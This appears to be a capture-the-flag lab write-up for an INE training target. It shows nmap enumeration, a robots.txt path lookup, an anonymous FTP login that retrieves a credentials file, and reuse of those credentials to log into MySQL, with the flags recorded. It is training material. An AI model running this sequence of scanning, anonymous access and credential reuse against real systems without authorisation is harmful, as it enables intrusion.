# target info
*IP*: `192.156.165.3`
*Domain*:`target.ine.local`
# Flags
1) FLAG1_7508a4342004460092b645ca215bfaf2
2) FLAG2_b8b658f632154ba88c23bc7aa58c4605
3) FLAG3_db341252c8374d9e88ac9f87432f4de2
4) FLAG4_0e9482b702f741238ea599f50053b8d3
# Enumeration
## Host Discovery
```shell
nmap -sn 192.156.165.1/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 18:17 IST
Nmap scan report for 192.156.165.1
Host is up (0.000051s latency).
MAC Address: 02:42:13:93:3F:E1 (Unknown)
Nmap scan report for target.ine.local (192.156.165.3)
Host is up (0.000026s latency).
MAC Address: 02:42:C0:9C:A5:03 (Unknown)
Nmap scan report for INE (192.156.165.2)
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 1.98 seconds
```

## Service enumeration
```shell
- sudo nmap -sS -sV -A -T4 target.ine.local

PORT     STATE SERVICE  VERSION

21/tcp   open  ftp      vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.156.165.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              22 Oct 28  2024 creds.txt
|_-rw-r--r--    1 0        0              39 May 12 12:45 flag.txt

22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a5:93:0f:6b:5a:77:f1:77:e8:2e:c9:31:e7:df:66:06 (ECDSA)
|_  256 b6:0d:e4:92:36:30:79:b7:31:91:3b:a0:1f:c1:ee:85 (ED25519)

25/tcp   open  smtp     Postfix smtpd
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2024-10-28T06:10:50
|_Not valid after:  2034-10-26T06:10:50
|_smtp-commands: localhost.members.linode.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time

80/tcp   open  http     Werkzeug/3.0.6 Python/3.10.12
|_http-title: CTF Challenge
| http-robots.txt: 3 disallowed entries 
|_/photos /secret-info/ /data/
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.10.12
|     Date: Mon, 12 May 2025 12:49:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2557
|     Server: FLAG1_7508a4342004460092b645ca215bfaf2
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <link rel="shortcut icon" href="#">
|     <title>CTF Challenge</title>
|     <style>
|     body {
|     font-family: 'Arial', sans-serif;
|     margin: 0;
|     padding: 0;
|     background-color: #1c1c1c;
|     color: #fff;
|     background-color: #333;
|     padding: 15px;
|     text-align: center;
|     list-style: none;
|     margin: 0;
|     padding: 0;
|     display:
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.6 Python/3.10.12
|     Date: Mon, 12 May 2025 12:49:30 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Server: FLAG1_7508a4342004460092b645ca215bfaf2
|     Content-Length: 0
|_    Connection: close
|_http-server-header: Werkzeug/3.0.6 Python/3.10.12

143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2024-10-28T06:10:50
|_Not valid after:  2034-10-26T06:10:50
|_imap-capabilities: ENABLE more have LOGIN-REFERRALS IDLE capabilities post-login listed OK ID IMAP4rev1 LOGINDISABLEDA0001 Pre-login LITERAL+ SASL-IR STARTTLS

993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=localhost
| Subject Alternative Name: DNS:localhost
| Not valid before: 2024-10-28T06:10:50
|_Not valid after:  2034-10-26T06:10:50
|_imap-capabilities: ENABLE more LOGIN-REFERRALS IDLE capabilities post-login listed OK ID IMAP4rev1 have Pre-login LITERAL+ SASL-IR AUTH=PLAINA0001
|_ssl-date: TLS randomness does not represent time

3306/tcp open  mysql    MySQL 8.0.39-0ubuntu0.22.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.39_Auto_Generated_Server_Certificate
| Not valid before: 2024-10-28T06:11:13
|_Not valid after:  2034-10-26T06:11:13
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.39-0ubuntu0.22.04.1
|   Thread ID: 16
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, LongColumnFlag, IgnoreSigpipes, InteractiveClient, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, SupportsTransactions, SwitchToSSLAfterHandshake, ODBCClient, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsCompression, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: L:%V_Z*F5\x10xiMM\{yZeq
|_  Auth Plugin Name: caching_sha2_password

Network Distance: 1 hop
Service Info: Host:  localhost.members.linode.com; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.09 ms target.ine.local (192.156.165.3)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.90 seconds
```

## robots.txt
```shell
# robots.txt
curl http://target.ine.local/secret-info/flag.txt FLAG2_b8b658f632154ba88c23bc7aa58c4605
```

# Exploitation
Weak creds
ftp anonymous access allowed
## exploiting ftp 
```shell
ftp target.ine.local                                                                                                                                    
Connected to target.ine.local.
220 (vsFTPd 3.0.5)
Name (target.ine.local:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||62686|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              22 Oct 28  2024 creds.txt
-rw-r--r--    1 0        0              39 May 12 12:45 flag.txt
226 Directory send OK.
ftp> 
ftp> get creds.txt
local: creds.txt remote: creds.txt
229 Entering Extended Passive Mode (|||18403|)
150 Opening BINARY mode data connection for creds.txt (22 bytes).
100% |***************************************************************************************************************|    22       65.50 KiB/s    00:00 ETA
226 Transfer complete.
22 bytes received in 00:00 (31.36 KiB/s)
ftp> more flag.txt
FLAG3_db341252c8374d9e88ac9f87432f4de2
ftp> 

```
*-> found flag 3 * `and` *found creds file*
```shell
# creds.txt
cat creds.txt
db_admin:password@123
```
-> look like mysql creds ; use it
## exploiting mysql
-> use found username and password
```shell
# mysql
- mysql -u db_admin -h target.ine.local -ppassword@123
MySQL [(none)]> show databases;
+----------------------------------------+
| Database                               |
+----------------------------------------+
| FLAG4_0e9482b702f741238ea599f50053b8d3 |
| information_schema                     |
| mysql                                  |
| performance_schema                     |
| sys                                    |
+----------------------------------------+
5 rows in set (0.003 sec)


```